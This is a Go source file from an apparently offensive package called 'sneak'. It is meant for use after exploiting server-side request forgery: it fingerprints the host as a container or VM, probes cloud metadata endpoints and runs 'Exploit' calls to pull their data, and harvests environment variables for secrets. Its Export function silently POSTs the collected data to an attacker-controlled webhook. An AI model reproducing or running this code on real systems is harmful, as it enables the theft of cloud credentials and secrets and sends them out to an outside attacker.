package sneak

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	Container   string = "container"
	VirtMachine        = "vm"
)

// Exfiltrated information that we can use for post-exploitation
type SsrfResults map[string]string

// Main interface for enumerating the environment and storing the results for
// output and/or webhook
type Enumerator struct {
	Hostname string                  `json:"hostname"`
	EnvType  string                  `json:"env"`
	Results  map[string]*SsrfResults `json:"ssrf_results"`
}

// Creates a new Enumerator, populates with inital recon,
// and prepare to build from SSRF checks.
func StartEnum() *Enumerator {
	var hostname string
	hostname, err := os.Hostname()
	if err != nil {
		hostname = ""
	}

	// check for Docker by control groups
	var envtype string
	b, err := ioutil.ReadFile("/proc/1/cgroup")
	if err != nil {
		envtype = VirtMachine
	} else if strings.Contains(string(b), "docker") {
		envtype = Container
	} else {
		envtype = VirtMachine
	}

	return &Enumerator{
		Hostname: hostname,
		EnvType:  envtype,
		Results: map[string]*SsrfResults{
			"cloud": nil,
			"net":   nil,
			"env":   nil,
		},
	}
}

// Test for SSRF against either a single specified cloud provider,
// or enumerate all for juicy information.
func (e *Enumerator) CheckCloud(specific *string) error {
	metadata := GetMetadataEndpoints()

	// if specified, test only for the specific cloud provider
	if specific != nil && *specific != "" {
		provider := *specific
		action, ok := metadata[provider]
		if !ok {
			return errors.New("specified cloud provider not found")
		}
		if !action.CheckLitmus() {
			return errors.New("specified cloud provider does not have metadata endpoint exposed")
		}

		// if we're good, exploit and recover metadata
		results := action.Exploit()
		e.Results["cloud"] = &results
		return nil
	}

	// test for each available metadata endpoint
	for provider, action := range metadata {
		log.Printf("Testing for provider %s\n", provider)

		// skip if litmus test for provider fails
		if !action.CheckLitmus() {
			log.Printf("Cannot reach metadata endpoint for %s\n", provider)
			continue
		}

		// if we're good, exploit and recover metadata
		results := action.Exploit()
		e.Results["cloud"] = &results
		break
	}
	return nil
}

func (e *Enumerator) CheckNet() {
}

// Enumerates global environment variables for secrets and URLs, and
// additionally checks for dotenvs on disk.
func (e *Enumerator) CheckEnv() {

	// list of all envvars that we can toss out
	ignoreList := []string{
		"TERM",
		"SHELL",
		"HISTSIZE",
		"HISTCONTROL",
		"SSH_TTY",
		"LC_ALL",
		"LANG",
		"MAIL",
		"SHLVL",
		"XDG_RUNTIME_DIR",
		"XDG_SESSION_ID",
		"LS_COLORS",
	}

	envvars := SsrfResults{}
	for _, env := range os.Environ() {
		pair := strings.SplitN(env, "=", 2)
		if Contains(ignoreList, pair[0]) {
			continue
		}
		envvars[pair[0]] = pair[1]
	}
	e.Results["env"] = &envvars
}

// Outputs results to stdout, or in the case of blind test, send back
// results to an attacker-controlled webhook.
func (e *Enumerator) Export(webhook *string, silent bool) error {
	jsonified, err := json.MarshalIndent(e, "", "  ")
	if err != nil {
		panic(err)
	}

	// assumes that the webhook can accept arbitrary content, send as POST
	if webhook != nil && *webhook != "" {
		client := http.Client{
			Timeout: time.Duration(2 * time.Second),
		}

		req, err := http.NewRequest("POST", *webhook, bytes.NewBuffer(jsonified))
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", "application/json")

		// fire, ignore the response and only print if failed
		if _, err = client.Do(req); err != nil {
			fmt.Printf("Error from webhook: %s\n", err)
		}
	}

	if !silent {
		fmt.Printf("%s\n", string(jsonified))
	}
	return nil
}
